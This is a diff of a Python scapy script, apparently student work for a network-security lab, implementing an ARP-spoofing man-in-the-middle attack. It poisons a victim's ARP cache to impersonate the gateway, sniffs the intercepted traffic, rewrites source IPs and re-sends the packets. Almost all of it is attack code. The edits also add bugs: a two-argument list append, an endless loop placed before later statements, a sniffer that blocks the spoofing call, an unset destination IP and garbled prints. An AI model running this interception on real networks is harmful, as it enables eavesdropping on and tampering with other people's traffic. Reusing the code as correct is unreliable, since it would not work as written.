@@ -6,10 +6,10 @@ import time
 import binascii
 import subprocess
 from time import sleep
-from scapy.all import ARP, send, Ether, srp, sendp, sniff
+from scapy.all import *
 
-hackedMachines = []
 
+hackedMachines = ['10.0.0.5', 'b4:fa:48:de:86:51']
 # ***** Notes on packet listening using pcapy *****
 # -------- replace device to interface of choice -----------
 # devs = pcapy.findalldevs()
@@ -111,13 +111,12 @@ def spoof(targetIp, spoofIp):
 	ether.show()
 	arp = ARP(op=2, pdst=targetIp, psrc=spoofIp, hwdst=victim_mac, hwsrc=attacker_mac )
 	arp.show()
-	
+	hackedMachines.append(targetIp, victim_mac)
+	print("Hacke Machines!!: ", hackedMachines)
 	packet = ether / arp
 	while True:
 		sendp(packet)
 		sleep(5)
-	hackedMachines.append([targetIp, victim_mac])
-	
 	return None
 '''
 In this step, you will implement full routing to intercept and forward network traffic. This is the most challenging part of the lab. 
@@ -148,12 +147,43 @@ It captures packets and processes them to forward packets to the intended destin
 Returns: None
 """
 
-def packet_callback(pkt):
+def packet_analyzer(packet):
+    #print("\n### Packet Details ###")
+    #print(packet.summary())
 
+    dst_mac = ""
+    dst_ip = ""
+
+    # Check if the packet has an Ethernet layer
+    if Ether in packet:
+        src_mac = packet[Ether].src
+        dst_mac = packet[Ether].dst
+        #print(f"Source MAC: {src_mac}")
+        #print(f"Destination MAC: {dst_mac}")
+
+    # Check if the packet has an IP layer, spoofed ip to make modification of packet noticable in wireshark
+    spoofed_ip = "10.0.0.135"
+    if IP in packet:
+        packet[IP].src = spoofed_ip
+        #src_ip = packet[IP].src
+        #dst_ip = packet[IP].dst
+        #proto = packet[IP].proto
+        #print(f"Source IP: {src_ip}")
+        #print(f"Destination IP: {dst_ip}")
+        #print(f"Protocol: {proto}")
+
+    # Log destination information
+    #print(f"Destination MAC: {dst_mac}")
+    #print(f"Destination IP: {dst_ip}")
+
+    # Check if the packet is destined for any hacked machines
+    if dst_ip in hackedMachines or dst_mac in hackedMachines:
+    		#print("Packet SENT!!!***********************************************************")
+    		sendp(packet) 
 
 def startSniffer():
-	print("yo")
-	pkts = sniff( prn=packet_callback() )
+	print("Packet yo")
+	a=sniff(filter="ip",prn=packet_analyzer)
 	pass
     
     
@@ -161,6 +191,7 @@ def startSniffer():
 if __name__ == "__main__": 
 	print("Mac Address for IP: 10.0.0.5 is: " + getMacAddress('10.0.0.5'))
 	print("Machine Ip address: "+ getOwnIpAddress()[0] )
+	print("Hscked masdjsfbnfiwaednjvl******: ", hackedMachines)
 	startSniffer()
 	print(spoof('10.0.0.5', '10.0.0.1'))
 	
